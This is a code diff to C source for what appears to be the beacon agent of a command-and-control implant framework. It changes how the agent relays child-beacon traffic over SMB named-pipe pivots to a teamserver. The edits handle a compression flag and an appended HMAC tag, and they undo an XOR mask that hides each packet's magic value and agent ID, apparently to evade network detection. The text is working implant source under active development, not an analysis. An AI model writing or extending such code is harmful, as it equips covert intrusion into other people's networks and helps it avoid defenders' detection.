@@ -6,6 +6,7 @@
 #include <core/MiniStd.h>
 #include <core/Command.h>
 #include <core/Package.h>
+#include <crypt/HmacSha256.h>
 
 /* TODO: Change the way new pivots gets added.
  *
@@ -262,11 +263,39 @@ VOID PivotPush()
                     {
                         if ( Instance->Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
                         {
-                            Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
+                            /* [HVC-007 2026-03-28] The child Demon's PackageTransmitAll
+                             * sets bit 31 of the big-endian SIZE field to signal LZNT1
+                             * compression (see TrafficImprovements.md §7).  Strip that bit
+                             * before converting the SIZE to a byte-count so we don't try
+                             * to allocate 2 GB+ from the pipe. The teamserver handles
+                             * decompression after receiving the packet via the parent.
+                             *
+                             * [BUGFIX-002 2026-03-28] PackageTransmitAll (HVC-006) appends a
+                             * 32-byte HMAC-SHA256 tag after the wire buffer.  The SIZE field
+                             * in the packet encodes the number of bytes after the SIZE field
+                             * itself, NOT including the HMAC tag.  We must allocate enough
+                             * space for the full authenticated message: SIZE_value + 4 + 32.
+                             * Without this fix ReadFile returns ERROR_MORE_DATA (buffer too
+                             * small for the pipe message), the packet is discarded, and the
+                             * child beacon appears to stop checking in after registration. */
+                            UINT32 RawSize = __builtin_bswap32( Length );
+                            Length = ( RawSize & 0x7FFFFFFF ) + sizeof( UINT32 ) + HMAC_SHA256_SIZE;
+
+                            PRINTF( "PivotPush: DemonID[%x] RawSizeField[0x%x] AllocLen[0x%x] BytesAvail[0x%x]\n",
+                                    TempList->DemonID, RawSize, Length, BytesSize )
+
                             Output = Instance->Win32.LocalAlloc( LPTR, Length );
+
+                            if ( ! Output )
+                            {
+                                PRINTF( "PivotPush: LocalAlloc(%d) failed\n", Length )
+                                break;
+                            }
 
                             if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                             {
+                                PRINTF( "PivotPush: Read 0x%x bytes from pivot [%x], forwarding to teamserver\n", BytesSize, TempList->DemonID )
+
                                 Package = PackageCreate( DEMON_COMMAND_PIVOT );
                                 PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                                 PackageAddBytes( Package, Output, BytesSize );
@@ -277,7 +306,7 @@ VOID PivotPush()
                             }
                             else
                             {
-                                PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
+                                PRINTF( "PivotPush: ReadFile failed[%d]\n", NtGetLastError() );
                                 DATA_FREE( Output, Length );
                                 break;
                             }
@@ -330,14 +359,37 @@ VOID PivotPush()
 
 UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )
 {
-    PARSER Parser  = { 0 };
-    UINT32 Value   = 0;
+    PARSER Parser     = { 0 };
+    UINT32 Value      = 0;
+    UINT32 SizeRaw    = 0;
+    UINT32 Mask       = 0;
+    UCHAR  MaskBytes[4];
+    int    i;
 
     ParserNew( &Parser, Response, Size );
 
-    ParserGetInt32( &Parser );
-    ParserGetInt32( &Parser );
+    // Read SIZE (bytes 0-3, big-endian, unmasked on wire)
+    SizeRaw = __builtin_bswap32( ParserGetInt32( &Parser ) );
 
+    // [HVC-003 2026-03-26] Bytes 4-19 of the wire packet are XOR-masked with
+    // (SIZE ^ HEADER_MASK_SEED) repeating.  Undo the mask on the next 8 bytes
+    // (MagicValue + AgentID) so we read the real AgentID.
+    Mask = SizeRaw ^ HEADER_MASK_SEED;
+    MaskBytes[0] = (UCHAR)( Mask >> 24 );
+    MaskBytes[1] = (UCHAR)( Mask >> 16 );
+    MaskBytes[2] = (UCHAR)( Mask >>  8 );
+    MaskBytes[3] = (UCHAR)  Mask;
+
+    if ( Parser.Length >= 8 )
+    {
+        for ( i = 0; i < 8; i++ ) {
+            Parser.Buffer[i] ^= MaskBytes[i % 4];
+        }
+    }
+
+    ParserGetInt32( &Parser );  // skip unmasked MagicValue
+
+    // AgentID is stored big-endian on the wire
     Value = __builtin_bswap32( ParserGetInt32( &Parser ) );
 
     PRINTF( "Parsed DemonID => %x\n", Value );
